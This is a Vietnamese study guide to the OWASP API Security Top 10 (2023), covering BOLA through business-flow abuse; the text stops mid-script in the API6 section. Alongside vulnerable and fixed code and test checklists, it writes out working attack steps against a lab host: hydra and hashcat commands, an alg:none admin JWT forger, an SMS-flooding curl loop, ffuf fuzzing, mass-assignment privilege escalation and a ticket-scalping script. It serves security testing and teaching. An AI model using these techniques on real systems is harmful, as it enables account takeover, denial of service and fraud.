# OWASP API Security Top 10 — Notes

## 📚 Mục lục

- [API1:2023 — Broken Object Level Authorization (BOLA)](#api12023--broken-object-level-authorization-bola)
  - [Khái niệm](#khái-niệm)
  - [Tại sao bị lỗi?](#tại-sao-bị-lỗi)
  - [Các loại Object ID thường gặp](#các-loại-object-id-thường-gặp)
  - [Các cách khai thác](#các-cách-khai-thác)
  - [Checklist khi test](#checklist-khi-test)
- [API2:2023 — Broken Authentication](#api22023--broken-authentication)
  - [Khái niệm](#khái-niệm-1)
  - [Tại sao bị lỗi?](#tại-sao-bị-lỗi-1)
  - [Các cách khai thác](#các-cách-khai-thác-1)
  - [Checklist khi test](#checklist-khi-test-1)
- [API3:2023 — Broken Object Property Level Authorization (BOPLA)](#api32023--broken-object-property-level-authorization-bopla)
  - [Khái niệm](#khái-niệm-2)
  - [Tại sao bị lỗi?](#tại-sao-bị-lỗi-2)
  - [Các cách khai thác](#các-cách-khai-thác-2)
  - [Checklist khi test](#checklist-khi-test-2)
- [API4:2023 — Unrestricted Resource Consumption](#api42023--unrestricted-resource-consumption)
  - [Khái niệm](#khái-niệm-3)
  - [Tại sao bị lỗi?](#tại-sao-bị-lỗi-3)
  - [Các cách khai thác](#các-cách-khai-thác-3)
  - [Checklist khi test](#checklist-khi-test-3)
- [API5:2023 — Broken Function Level Authorization (BFLA)](#api52023--broken-function-level-authorization-bfla)
  - [Khái niệm](#khái-niệm-4)
  - [Tại sao bị lỗi?](#tại-sao-bị-lỗi-4)
  - [Các cách khai thác](#các-cách-khai-thác-4)
  - [Checklist khi test](#checklist-khi-test-4)
- [API6:2023 — Unrestricted Access to Sensitive Business Flows](#api62023--unrestricted-access-to-sensitive-business-flows)
  - [Khái niệm](#khái-niệm-5)
  - [Tại sao bị lỗi?](#tại-sao-bị-lỗi-5)
  - [Các cách khai thác](#các-cách-khai-thác-5)
  - [Checklist khi test](#checklist-khi-test-5)
- [API7:2023 — Server Side Request Forgery (SSRF)](#api72023--server-side-request-forgery-ssrf)
  - [Khái niệm](#khái-niệm-6)
  - [Tại sao bị lỗi?](#tại-sao-bị-lỗi-6)
  - [Kịch bản kinh điển](#kịch-bản-kinh-điển)
  - [Các cách khai thác](#các-cách-khai-thác-6)
  - [Checklist khi test](#checklist-khi-test-6)
- [API8:2023 — Security Misconfiguration](#api82023--security-misconfiguration)
  - [Khái niệm](#khái-niệm-7)
  - [Tại sao bị lỗi?](#tại-sao-bị-lỗi-7)
  - [Các cách khai thác](#các-cách-khai-thác-7)
  - [Checklist khi test](#checklist-khi-test-7)
- [API9:2023 — Improper Inventory Management](#api92023--improper-inventory-management)
  - [Khái niệm](#khái-niệm-8)
  - [Tại sao bị lỗi?](#tại-sao-bị-lỗi-8)
  - [Các cách khai thác](#các-cách-khai-thác-8)
  - [Checklist khi test](#checklist-khi-test-8)

---

# API1:2023 — Broken Object Level Authorization (BOLA)

## Khái niệm

BOLA còn được gọi là **IDOR (Insecure Direct Object Reference)** — hai tên khác nhau nhưng cùng một bản chất.

Lỗi xảy ra khi server **tin tưởng hoàn toàn vào cái ID mà client gửi lên** mà không thèm kiểm tra xem "thằng đang gửi request này có phải chủ sở hữu của cái ID đó không".

**Ví dụ thực tế:**
Bạn đăng nhập vào app ngân hàng, URL hiện ra:
```
GET /api/accounts/1001/balance
```
Bạn thử đổi `1001` thành `1002` — nếu server trả về số dư của tài khoản người khác thay vì báo lỗi 403, đó chính là BOLA.

**Điểm mấu chốt:**
Server có 2 bước kiểm tra:
- Bước 1 — **Authentication**: Mày là ai? Đã đăng nhập chưa? ✅ Server làm tốt
- Bước 2 — **Authorization**: Cái ID mày đang hỏi có phải của mày không? ❌ Server bỏ qua

Vì bỏ qua bước 2 nên chỉ cần có tài khoản hợp lệ là có thể xem data của bất kỳ ai.

> **CWE liên quan:** CWE-639 — Authorization Bypass Through User-Controlled Key

---

## Tại sao bị lỗi?

Server nhận ID từ request → query thẳng vào DB → trả về data mà **không verify xem ID đó có thuộc về user đang request không**.

```python
# ❌ Vulnerable — chỉ check đăng nhập, không check ownership
@app.get("/api/orders/{order_id}")
def get_order(order_id: int):
    return db.query(Order).filter(Order.id == order_id).first()

# ✅ Fixed — check thêm order này có phải của user hiện tại không
@app.get("/api/orders/{order_id}")
def get_order(order_id: int, current_user = Depends(get_current_user)):
    order = db.query(Order).filter(Order.id == order_id).first()
    if order.user_id != current_user.id:
        raise HTTPException(403)
    return order
```

---

## Các loại Object ID thường gặp

| Loại | Ví dụ | Ghi chú |
|------|-------|---------|
| Sequential integer | `/users/1`, `/users/2` | Dễ đoán nhất |
| UUID | `/docs/550e8400-e29b-41d4-a716-446655440000` | Khó đoán nhưng không phải fix |
| Slug | `/profile/john_doe` | Tìm qua trang public |
| Encoded | `/file/dXNlcjEyMw==` | Decode base64 là ra |
| Indirect | `/me/orders` nhưng body chứa `user_id` | Ẩn trong body |

> UUID trông có vẻ an toàn vì khó đoán, nhưng nếu server không check ownership thì chỉ cần leak UUID ra là xong — UUID không phải là giải pháp bảo mật.

---

## Các cách khai thác

### 1. ID Enumeration — Đổi số thứ tự
Đơn giản nhất: thấy ID dạng số thì tăng/giảm lên xem có lấy được data của người khác không.
```http
GET /api/users/100/profile HTTP/1.1
GET /api/users/101/profile HTTP/1.1
GET /api/users/102/profile HTTP/1.1
```
Dùng Burp Intruder hoặc ffuf để tự động fuzz cả dải số.

---

### 2. ID Swap trong Body / Parameter
Không chỉ trên URL — ID có thể nằm trong request body hoặc query string.
```http
# Request gốc của mình
POST /api/transfer HTTP/1.1
{"from_account": "ACC-001", "to_account": "ACC-999", "amount": 100}

# Đổi from_account thành account của victim
{"from_account": "ACC-002", "to_account": "ACC-999", "amount": 100}
```

---

### 3. HTTP Method Tampering
Server chỉ check quyền trên GET nhưng quên check trên DELETE/PUT.
```http
# Dùng token của user thường để xóa post của người khác
DELETE /api/posts/55 HTTP/1.1
Authorization: Bearer <token_of_normal_user>
```

---

### 4. Nested Resource — Đổi ID của resource cha
Thay ID ở cấp cha để leo sang data của user khác.
```http
GET /api/users/99/documents HTTP/1.1
GET /api/teams/5/members HTTP/1.1
```

---

### 5. Mass Assignment / Hidden Field
Server dùng `user_id` từ body thay vì lấy từ JWT.
```http
PATCH /api/profile HTTP/1.1
{"username": "me", "user_id": 42}   ← inject user_id của victim
```

---

### 6. Export / Download Endpoint
Các endpoint export thường bị bỏ sót authz check vì dev hay quên.
```http
GET /api/reports/export?report_id=789
GET /api/invoices/download/456
```

---

### 7. GraphQL — Query với ID tùy ý
```graphql
query {
  user(id: "victim_id") {
    email
    phone
    address
  }
}
```

---

### 8. Pivot từ ID lộ trong Response
Response trả về ID của object liên quan → dùng ID đó để tấn công endpoint khác.
```json
{"order_id": 1001, "user_id": 55, "invoice_id": 3021}
```
Lấy `invoice_id: 3021` → thử `GET /api/invoices/3021` bằng token của mình.

---

## Checklist khi test

- [ ] Tạo 2 account (A và B), lấy ID của object thuộc B, dùng token A để truy cập
- [ ] Fuzz tất cả numeric/UUID parameter trong path, query string, body, header
- [ ] Test cả GET / POST / PUT / PATCH / DELETE
- [ ] Kiểm tra endpoint export, download, preview
- [ ] Kiểm tra nested resource (`/users/{id}/...`)
- [ ] Kiểm tra GraphQL introspection + query với ID tùy ý
- [ ] Decode base64/JWT để tìm hidden ID field

---

# API2:2023 — Broken Authentication

## Khái niệm

Broken Authentication xảy ra khi **cơ chế xác thực của API bị triển khai sai hoặc thiếu sót**, khiến attacker có thể chiếm tài khoản hoặc bypass hoàn toàn bước đăng nhập.

**Ví dụ thực tế:**
Bạn quên mật khẩu, app gửi mã OTP 6 số về điện thoại. Nếu API xác thực OTP không giới hạn số lần thử, attacker chỉ cần viết script thử từ `000000` đến `999999` — chỉ có 1 triệu khả năng, máy tính thử hết trong vài phút.

**Điểm mấu chốt:**
Hệ thống xác thực bị "vỡ" khi:
- Cho phép thử mật khẩu / OTP không giới hạn số lần → **Brute force**
- Token JWT bị làm giả được → **Token manipulation**
- Endpoint nhạy cảm không cần token vẫn truy cập được → **Missing auth**

> **CWE liên quan:** CWE-307 — Improper Restriction of Excessive Authentication Attempts

---

## Tại sao bị lỗi?

| Nguyên nhân | Hậu quả |
|-------------|---------|
| Không có rate limiting | Brute force mật khẩu / OTP thoải mái |
| JWT secret yếu hoặc `alg: none` | Tự tạo token giả với role admin |
| Endpoint không verify token | Gọi thẳng không cần đăng nhập |
| Token không có expiry | Token cũ dùng mãi mãi |
| Reset token predictable | Đoán được link reset password |
| Token lộ trong URL | Bị lưu vào server log, browser history |

---

## Các cách khai thác

### 1. Brute Force / Credential Stuffing
Không có rate limit → thử mật khẩu thoải mái.
```http
POST /api/login HTTP/1.1
{"username": "admin", "password": "password123"}
```
```bash
# [ATTACKER]
hydra -L users.txt -P passwords.txt target.lab http-post-form \
  "/api/login:username=^USER^&password=^PASS^:Invalid credentials"
```

---

### 2. JWT `alg: none` — Tạo Token Không Cần Ký
Một số server chấp nhận JWT với `alg: none`, tức là không cần signature → tự tạo token với role admin.
```python
import base64, json

header  = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=")
payload = base64.urlsafe_b64encode(json.dumps({"user_id":1,"role":"admin"}).encode()).rstrip(b"=")
token   = f"{header.decode()}.{payload.decode()}."  # signature để trống
```

---

### 3. JWT Weak Secret — Crack Chữ Ký
Server dùng secret yếu như `secret`, `123456` → crack được → tự ký token tùy ý.
```bash
# [ATTACKER]
hashcat -a 0 -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt
```

---

### 4. JWT RS256 → HS256 Confusion
Server dùng RS256 (cặp public/private key). Nếu server không validate `alg`:
```
1. Lấy public key của server (thường public)
2. Đổi alg trong header từ RS256 → HS256
3. Ký token bằng public key như HMAC secret
→ Server verify bằng public key → pass!
```

---

### 5. OTP / 2FA Brute Force
OTP 6 số = 1 triệu khả năng. Không có rate limit → enumerate hết.
```http
POST /api/verify-otp HTTP/1.1
{"otp": "000000"}
{"otp": "000001"}
...
```

---

### 6. Token Leak qua URL
Token trong query string → bị lưu vào server log, browser history, Referer header.
```http
GET /api/user/profile?token=eyJhbGc... HTTP/1.1
```

---

### 7. Missing Authentication trên Sensitive Endpoint
Dev quên gắn middleware xác thực vào một số endpoint.
```http
GET /api/admin/users HTTP/1.1
→ 200 OK (không cần token!)
```

---

### 8. Password Reset Token Predictable / Reusable
Token reset dạng timestamp hoặc sequential → đoán được. Hoặc token không expire → dùng lại mãi.
```http
GET /api/reset?token=1720000001
GET /api/reset?token=1720000002
```

---

### 9. OAuth Misconfiguration
```
- redirect_uri không validate → token bị redirect về server của attacker
- Không có state parameter → CSRF trên OAuth flow
- Implicit flow → token lộ trong URL fragment
```

---

## Checklist khi test

- [ ] Test brute force login — có rate limit / lockout không?
- [ ] Decode JWT, kiểm tra `alg`, thử đổi sang `none`
- [ ] Brute force JWT secret bằng hashcat / john
- [ ] Thử đổi `alg` từ RS256 → HS256 với public key
- [ ] Brute force OTP — có rate limit không?
- [ ] Kiểm tra token có nằm trong URL / log không
- [ ] Gọi sensitive endpoint không kèm token → có trả 401 không?
- [ ] Kiểm tra token expiry — token cũ còn dùng được không?
- [ ] Kiểm tra password reset token — có predictable / reusable không?
- [ ] Kiểm tra OAuth `redirect_uri` validation và `state` parameter

---

# API3:2023 — Broken Object Property Level Authorization (BOPLA)

## Khái niệm

BOPLA là sự kết hợp của 2 vấn đề cũ:
- **Excessive Data Exposure** — Server trả về quá nhiều field, để client tự ẩn đi
- **Mass Assignment** — Server nhận field từ client rồi gán thẳng vào DB không lọc

Nếu BOLA là "truy cập sai object" thì BOPLA là **"đúng object nhưng đọc/ghi sai field"**.

**Ví dụ Excessive Data Exposure:**
Bạn là tài xế gọi xe, app gọi API lấy thông tin khách hàng để hiển thị tên + số điện thoại. Nhưng server lười, trả về luôn cả `password_hash`, `credit_card`, `internal_notes` của khách. App chỉ hiển thị tên + SĐT lên màn hình, nhưng nếu bạn bật Burp lên xem raw response thì thấy hết.

**Ví dụ Mass Assignment:**
Bạn update profile, gửi lên `{"username": "alice"}`. Bạn thử thêm `"role": "admin"` vào body. Nếu server bind toàn bộ body vào DB model mà không lọc → bạn vừa tự phong mình làm admin.

---

## Tại sao bị lỗi?

| Nguyên nhân | Mô tả |
|-------------|-------|
| Serialize toàn bộ DB model | Trả về raw model thay vì chỉ trả field cần thiết |
| Không có input whitelist | Bind trực tiếp `request.body` vào ORM |
| Filter ở phía client | Server trả hết, app tự ẩn — nhưng Burp thấy tất cả |
| Framework auto-binding | Rails, Laravel bind field tự động nếu cấu hình sai |

```python
# ❌ Vulnerable — trả về toàn bộ model, kể cả password_hash, is_admin
@app.get("/api/users/me")
def get_me(current_user = Depends(get_current_user)):
    return current_user

# ✅ Fixed — dùng response_model để chỉ trả field được phép
class UserPublic(BaseModel):
    id: int
    username: str
    email: str

@app.get("/api/users/me", response_model=UserPublic)
def get_me(current_user = Depends(get_current_user)):
    return current_user
```

---

## Các cách khai thác

### 1. Excessive Data Exposure — Đọc Field Ẩn
UI chỉ hiển thị tên + email, nhưng raw JSON response chứa nhiều hơn thế.
```http
GET /api/users/me HTTP/1.1
Authorization: Bearer <token>
```
```json
{
  "id": 10,
  "username": "alice",
  "email": "alice@lab.local",
  "password_hash": "$2b$12$...",     ← không hiển thị trên UI nhưng có trong JSON
  "is_admin": false,
  "api_key": "sk-...",
  "internal_notes": "VIP customer"
}
```
Dùng Burp hoặc DevTools → tab Network → xem raw response.

---

### 2. Mass Assignment — Leo Quyền
Thêm field nhạy cảm vào body khi update profile.
```http
# Bình thường
PATCH /api/profile HTTP/1.1
{"username": "alice"}

# Thêm field nhạy cảm
PATCH /api/profile HTTP/1.1
{"username": "alice", "role": "admin", "is_verified": true, "credit": 99999}
```
Nếu server bind toàn bộ body vào model → các field này bị ghi vào DB.

---

### 3. Mass Assignment — Khi Đăng Ký
Thêm field privilege vào request đăng ký tài khoản.
```http
POST /api/register HTTP/1.1
{
  "username": "attacker",
  "password": "pass123",
  "email": "attacker@lab.local",
  "email_verified": true,
  "admin": true
}
```

---

### 4. PUT Endpoint — Dễ Bị Bỏ Sót Hơn PATCH
PUT thay thế toàn bộ object → dev hay quên filter field trên PUT.
```http
PUT /api/users/me HTTP/1.1
{
  "username": "alice",
  "email": "alice@lab.local",
  "role": "admin"
}
```

---

### 5. Nested Object Expose Data Nhạy Cảm
Không chỉ object chính — object lồng bên trong cũng có thể bị expose.
```http
GET /api/orders/1001 HTTP/1.1
```
```json
{
  "order_id": 1001,
  "user": {
    "id": 55,
    "username": "alice",
    "password_hash": "$2b$12$...",      ← nested object bị expose
    "internal_credit_score": 720
  }
}
```

---

### 6. GraphQL — Query Field Không Được Phép
GraphQL trả về bất kỳ field nào được query nếu không có field-level authorization.
```graphql
query {
  me {
    id
    username
    passwordHash
    isAdmin
    apiKey
    internalNotes
  }
}
```

---

### 7. JSON Merge Patch — Ghi Field Ẩn
```http
PATCH /api/profile HTTP/1.1
Content-Type: application/merge-patch+json
{
  "subscription_plan": "enterprise",
  "trial_expires": "2099-12-31"
}
```

---

## Checklist khi test

- [ ] Xem raw JSON response — có field nào không hiển thị trên UI không?
- [ ] Thêm field nhạy cảm vào PATCH/PUT/POST body: `role`, `is_admin`, `balance`, `verified`
- [ ] Test endpoint đăng ký — inject field privilege escalation
- [ ] Kiểm tra nested object trong response có expose data nhạy cảm không
- [ ] Dùng GraphQL introspection → query tất cả field có thể
- [ ] So sánh request body schema với DB model — field nào server nhận nhưng không document?
- [ ] Test PUT endpoint — thường ít được bảo vệ hơn PATCH

---

# API4:2023 — Unrestricted Resource Consumption

## Khái niệm

Unrestricted Resource Consumption xảy ra khi API **không giới hạn lượng tài nguyên mà một client có thể tiêu thụ** — bao gồm CPU, memory, bandwidth, database query, tiền (third-party API), hay thời gian xử lý.

**Ví dụ thực tế:**
App của bạn có tính năng "Gửi SMS xác thực". Mỗi lần gọi API đó, server gọi sang Twilio và tốn $0.01. Nếu không có rate limit, attacker viết script gọi endpoint đó 100.000 lần trong 1 giờ → bạn mất $1.000 tiền SMS mà không hay biết.

**Điểm mấu chốt:**
Khác với các lỗi trước tập trung vào *quyền truy cập*, API4 tập trung vào *tài nguyên*:
- Attacker không cần chiếm tài khoản
- Chỉ cần gửi request liên tục / request nặng là đủ gây hại
- Hậu quả: **DoS, bill khổng lồ, hệ thống chậm/sập**

> **CWE liên quan:** CWE-770 — Allocation of Resources Without Limits or Throttling

---

## Tại sao bị lỗi?

| Nguyên nhân | Hậu quả |
|-------------|---------|
| Không có rate limiting | Gửi request không giới hạn |
| Không giới hạn payload size | Upload file cực lớn làm tràn disk/memory |
| Không giới hạn kết quả trả về | Query trả về hàng triệu record một lúc |
| Không giới hạn tham số số lượng | `?limit=999999` trả về toàn bộ DB |
| Gọi third-party API không kiểm soát | Mỗi request tốn tiền → bill tăng vọt |
| Timeout quá dài hoặc không có | Request giữ connection mãi → resource exhaustion |

---

## Các cách khai thác

### 1. API Rate Limit Abuse — Gửi Request Liên Tục
Không có rate limit → flood endpoint để làm chậm hoặc sập server.
```bash
# [ATTACKER] — gửi 1000 request song song
seq 1000 | xargs -P 50 -I{} curl -s -o /dev/null \
  -X POST https://target.lab/api/send-sms \
  -H "Authorization: Bearer <token>" \
  -d '{"phone": "+84900000000"}'
```
Mỗi request tốn tiền SMS → attacker làm cạn kiệt budget của nạn nhân.

---

### 2. Oversized Payload — Upload File Khổng Lồ
Không có giới hạn kích thước file → upload file cực lớn để tràn disk hoặc làm server OOM.

**Tạo file test bằng `dd`:**
```bash
# Cú pháp
# if=/dev/urandom  ← nguồn dữ liệu ngẫu nhiên (giả làp nội dung file thật)
# of=<tên file>   ← file đầu ra
# bs=1M           ← block size (1 MB mỗi lần ghi)
# count=30        ← số block → tổng = 30 x 1MB = 30MB
dd if=/dev/urandom of=certificateOfIncorporation.pdf bs=1M count=30

# Tạo file lớn hơn để test giới hạn khác nhau
dd if=/dev/urandom of=payload_100mb.pdf bs=1M count=100
dd if=/dev/urandom of=payload_1gb.zip  bs=1M count=1024
```

**Sau đó upload lên endpoint:**
```bash
# [ATTACKER]
curl -X POST https://target.lab/api/upload \
  -H "Authorization: Bearer <token>" \
  -F "file=@certificateOfIncorporation.pdf"
```

```http
POST /api/upload HTTP/1.1
Content-Type: multipart/form-data
Content-Length: 31457280   ← 30MB

[binary data...]
```

> Dùng tên file trông hợp lệ như `certificateOfIncorporation.pdf` để bypass filter theo tên/extension, nội dung bên trong là random bytes.

---

### 3. Pagination Abuse — Lấy Toàn Bộ DB Một Lần
Server không giới hạn tham số `limit` → query trả về hàng triệu record.
```http
GET /api/products?limit=999999 HTTP/1.1
GET /api/users?page=1&per_page=100000 HTTP/1.1
```
Một request duy nhất có thể làm DB timeout và treo cả hệ thống.

---

### 4. Regex / Search DoS (ReDoS)
Gửi input được thiết kế đặc biệt để khiến regex engine chạy mãi không dừng.
```http
GET /api/search?q=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab HTTP/1.1
```
Nếu server dùng regex phức tạp để validate/search → CPU spike 100%, request treo.

---

### 5. Resource-Intensive Endpoint Abuse
Một số endpoint tốn nhiều tài nguyên hơn bình thường — export PDF, render ảnh, gửi email hàng loạt.
```http
# Gọi liên tục endpoint export báo cáo nặng
GET /api/reports/export?format=pdf&year=2023 HTTP/1.1
GET /api/reports/export?format=pdf&year=2022 HTTP/1.1
GET /api/reports/export?format=pdf&year=2021 HTTP/1.1
```
Mỗi request render PDF tốn 2-3 giây CPU → 100 request song song = server chết.

---

### 6. GraphQL — Query Lồng Nhau Sâu (Deep Nesting)
GraphQL cho phép query lồng nhau → attacker tạo query cực sâu để làm DB join hàng chục bảng.
```graphql
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              id username email orders { items { product { reviews { author { friends { id } } } } } }
            }
          }
        }
      }
    }
  }
}
```
Một query này có thể tạo ra hàng triệu DB operation.

---

### 7. Wildcard / Bulk Operation Abuse
Endpoint hỗ trợ xử lý nhiều item một lúc nhưng không giới hạn số lượng.
```http
POST /api/messages/send-bulk HTTP/1.1
{
  "recipients": ["user1", "user2", ... "user50000"],
  "message": "Hello"
}
```

---

### 8. Third-Party API Cost Exhaustion
Mỗi lần gọi endpoint → server gọi sang dịch vụ trả phí (AI, SMS, email, map).
```http
# Mỗi request này tốn tiền OpenAI / Twilio / SendGrid
POST /api/ai/summarize HTTP/1.1
{"text": "..."}

POST /api/notify/sms HTTP/1.1
{"phone": "+84900000000"}
```
Flood endpoint → đốt hết credit của nạn nhân.

---

## Checklist khi test

- [ ] Gửi request liên tục đến endpoint — có bị rate limit không?
- [ ] Thử tham số `limit`, `per_page`, `count` với giá trị cực lớn
- [ ] Upload file không có giới hạn kích thước
- [ ] Tìm endpoint tốn tài nguyên (export, render, send) → flood thử
- [ ] Thử GraphQL query lồng nhau nhiều cấp
- [ ] Tìm endpoint gọi third-party API → gọi liên tục xem có bị chặn không
- [ ] Gửi payload cực lớn (body, header, query string) xem server xử lý thế nào
- [ ] Kiểm tra timeout — request giữ connection lâu có bị ngắt không?

---

# API5:2023 — Broken Function Level Authorization (BFLA)

## Khái niệm

BFLA xảy ra khi API **không kiểm tra xem user có quyền gọi một chức năng (function/endpoint) cụ thể hay không**, dẫn đến user thường có thể gọi được các chức năng chỉ dành cho admin.

**Phân biệt với BOLA:**
- **BOLA** — đúng chức năng, sai *object* → user A xem data của user B
- **BFLA** — sai *chức năng* → user thường gọi được endpoint chỉ admin mới được dùng

**Ví dụ thực tế:**
App quản lý nhân sự có 2 loại user: nhân viên và HR admin. Nhân viên chỉ được xem lương của mình. Nhưng nếu endpoint `DELETE /api/employees/55` không kiểm tra role → nhân viên thường có thể xóa hồ sơ của người khác.

**Điểm mấu chốt:**
Hệ thống chỉ ẩn endpoint admin trên UI, nhưng **không chặn ở phía server**. Attacker chỉ cần biết URL là gọi được.

> **CWE liên quan:** CWE-285 — Improper Authorization

---

## Tại sao bị lỗi?

| Nguyên nhân | Mô tả |
|-------------|-------|
| Chỉ ẩn UI, không chặn server | Admin endpoint không hiển trên menu nhưng vẫn gọi được |
| Kiểm tra role ở frontend | JS check role rồi ẩn nút, nhưng API không check |
| Thiếu middleware phân quyền | Endpoint quên gắn `require_admin` middleware |
| HTTP method khác nhau | GET được bảo vệ nhưng DELETE/PUT cùng path thì không |
| API version cũ | `/api/v1/admin/users` bị chặn nhưng `/api/v2/admin/users` thì không |

```python
# ❌ Vulnerable — chỉ check đăng nhập, không check role
@app.delete("/api/users/{user_id}")
def delete_user(user_id: int, current_user = Depends(get_current_user)):
    db.query(User).filter(User.id == user_id).delete()
    return {"msg": "deleted"}

# ✅ Fixed — check thêm role admin
@app.delete("/api/users/{user_id}")
def delete_user(user_id: int, current_user = Depends(get_current_user)):
    if current_user.role != "admin":
        raise HTTPException(403)
    db.query(User).filter(User.id == user_id).delete()
    return {"msg": "deleted"}
```

---

## Các cách khai thác

### 1. Truy Cập Trực Tiếp Admin Endpoint
Endpoint admin không hiển trên UI nhưng vẫn tồn tại trên server.
```http
# User thường gọi thẳng endpoint admin
GET  /api/admin/users HTTP/1.1
POST /api/admin/users/promote HTTP/1.1
DELETE /api/admin/users/55 HTTP/1.1
Authorization: Bearer <token_of_normal_user>
```
Nếu server chỉ ẩn trên UI mà không check role → trả về 200 OK.

---

### 2. HTTP Method Switching
Server chỉ bảo vệ GET nhưng quên bảo vệ các method khác trên cùng path.
```http
# GET được bảo vệ → 403
GET /api/users/55 HTTP/1.1

# DELETE cùng path nhưng không check role → 200 OK
DELETE /api/users/55 HTTP/1.1
Authorization: Bearer <token_of_normal_user>

# PUT để sửa role của user khác
PUT /api/users/55 HTTP/1.1
{"role": "admin"}
```

---

### 3. API Version Bypass
Version mới được vá nhưng version cũ vẫn chạy và không có auth check.
```http
# Bị chặn
GET /api/v2/admin/reports HTTP/1.1  → 403

# Version cũ vẫn hoạt động
GET /api/v1/admin/reports HTTP/1.1  → 200 OK
GET /api/admin/reports HTTP/1.1     → 200 OK  (không có version)
```

---

### 4. Path Traversal trong Endpoint
Thay đổi path để leo từ user endpoint sang admin endpoint.
```http
# Endpoint bình thường
GET /api/users/me/profile HTTP/1.1

# Thử leo lên
GET /api/users/admin/profile HTTP/1.1
GET /api/users/me/../admin/list HTTP/1.1
```

---

### 5. Parameter Pollution — Inject Role trong Request
Một số framework xử lý tham số trùng tên theo cách không đoán trước được.
```http
GET /api/users?role=user&role=admin HTTP/1.1
POST /api/action HTTP/1.1
{"action": "view", "action": "delete"}
```

---

### 6. Enum / Fuzz Endpoint Ẩn
Dùng wordlist để tìm endpoint admin chưa được document.
```bash
# [ATTACKER]
ffuf -u https://target.lab/api/FUZZ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/objects.txt \
  -H "Authorization: Bearer <user_token>" \
  -mc 200,201,204

# Fuzz thêm prefix admin
ffuf -u https://target.lab/api/admin/FUZZ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
  -H "Authorization: Bearer <user_token>" \
  -mc 200,201,204
```

---

### 7. Swagger / OpenAPI Leak
Nếu server expose file API docs → lấy được toàn bộ danh sách endpoint kể cả endpoint admin.
```http
GET /swagger.json HTTP/1.1
GET /openapi.json HTTP/1.1
GET /api/docs HTTP/1.1
GET /api-docs HTTP/1.1
```
Parse file JSON ra → có ngay toàn bộ endpoint, method, parameter để test.

---

## Checklist khi test

- [ ] Fuzz `/api/admin/`, `/api/internal/`, `/api/management/` bằng wordlist
- [ ] Thử tất cả HTTP method (GET/POST/PUT/PATCH/DELETE) trên mỗi endpoint
- [ ] Kiểm tra các API version cũ (`/v1/`, `/v2/`, không có version)
- [ ] Tìm Swagger / OpenAPI docs → lấy danh sách endpoint đầy đủ
- [ ] So sánh response khi gọi bằng token admin vs token user thường
- [ ] Kiểm tra JS bundle của frontend — thường chứa URL endpoint ẩn
- [ ] Thử path traversal trong endpoint (`/users/me/../admin/`)
- [ ] Kiểm tra endpoint có phân biệt role không hay chỉ check đăng nhập

---

# API6:2023 — Unrestricted Access to Sensitive Business Flows

## Khái niệm

Lỗ hổng này không phải lỗi code — API hoạt động đúng như thiết kế, nhưng **attacker lạm dụng luồng nghiệp vụ (business flow) theo cách mà con người bình thường không làm** — thường bằng cách tự động hóa (automation) ở tốc độ phi thực tế.

**Ví dụ thực tế:**
App bán vé concert có giới hạn "mỗi người mua tối đa 2 vé". Giới hạn này chỉ được check trên UI. Attacker viết script tạo 500 tài khoản, mỗi tài khoản mua 2 vé → vét sạch 1000 vé trong vài giây trước khi người dùng thật kịp vào.

**Phân biệt với API4:**
- **API4** — tấn công vào *tài nguyên kỹ thuật* (CPU, memory, bandwidth)
- **API6** — tấn công vào *giá trị kinh doanh* (vé, mã giảm giá, sản phẩm, điểm thưởng)

**Điểm mấu chốt:**
API hoạt động đúng, auth đúng, nhưng không có cơ chế phân biệt **hành vi con người** với **hành vi bot**.

---

## Tại sao bị lỗi?

| Nguyên nhân | Mô tả |
|-------------|-------|
| Giới hạn chỉ ở UI | Server không enforce giới hạn số lượng |
| Không phân biệt bot/người | Không có CAPTCHA, device fingerprint, behavioral check |
| Không giới hạn tần suất theo business | Rate limit kỹ thuật có nhưng không đủ chặn automation |
| Không detect bất thường | 500 tài khoản mới mua hàng trong 1 phút không bị flag |

---

## Các cách khai thác

### 1. Scalping — Vét Sạch Hàng Giới Hạn
Tự động hóa việc mua hàng trước khi người dùng thật kịp.
```python
# [ATTACKER] — mua hết vé bằng nhiều account
import requests, threading

def buy_ticket(token):
    requests.post("https://target.lab/api/tickets/buy",
        headers={"Authorization": f"Bearer {token}"},
        json={"event_id": 99, "quantity": 2})

tokens = ["<token_1>", "<token_2>", ...]  # 500 account
threads = [threading.Thread(target=buy_ticket, args=(t,)) for t in tokens]
[t.start() for t in threads]
```

---

### 2. Coupon / Promo Code Abuse
Mã giảm giá giới hạn 1 lần/user nhưng không check ở server.
```http
# Dùng cùng mã nhiều lần với các account khác nhau
POST /api/orders/apply-coupon HTTP/1.1
{"coupon": "SALE50", "order_id": 1001}  ← account A

POST /api/orders/apply-coupon HTTP/1.1
{"coupon": "SALE50", "order_id": 1002}  ← account B
```
Hoặc dùng lại mã sau khi đã hủy đơn hàng — mã chưa bị invalidate.

---

### 3. Referral / Reward Abuse
Hệ thống điểm thưởng khi giới thiệu bạn bè — tự giới thiệu chính mình bằng nhiều account.
```http
# Tạo vòng lặp: account A giới thiệu B, B giới thiệu C, C giới thiệu A
POST /api/referral/apply HTTP/1.1
{"referral_code": "CODE_A"}  ← gọi từ account B

POST /api/referral/apply HTTP/1.1
{"referral_code": "CODE_B"}  ← gọi từ account C
```

---

### 4. Account / Resource Enumeration Hàng Loạt
Tự động hóa việc tạo tài khoản để lạm dụng free tier / trial.
```python
# Tạo hàng loạt account để hưởng free credit
for i in range(1000):
    requests.post("https://target.lab/api/register", json={
        "email": f"attacker+{i}@lab.local",
        "password": "pass123"
    })
    # Mỗi account mới được $5 credit miễn phí → $5000 tổng cộng
```

---

### 5. Cart / Checkout Flow Manipulation
Thao túng luồng thanh toán để mua hàng với giá sai.
```http
# Bước 1: Thêm sản phẩm vào giỏ — giá $100
POST /api/cart/add
{"product_id": 5, "quantity": 1}

# Bước 2: Áp mã giảm giá — giảm 90%
POST /api/cart/coupon
{"code": "STAFF90"}

# Bước 3: Checkout — server không tính lại giá, tin vào giá từ session
POST /api/checkout
{"payment_method": "card"}
```

---

### 6. OTP / Verification Bypass bằng Automation
Tự động hóa bước xác minh để tạo hàng loạt tài khoản đã verify.
```python
# Tạo account + brute force OTP liên tục
for phone in phone_list:
    r = requests.post("/api/register", json={"phone": phone})
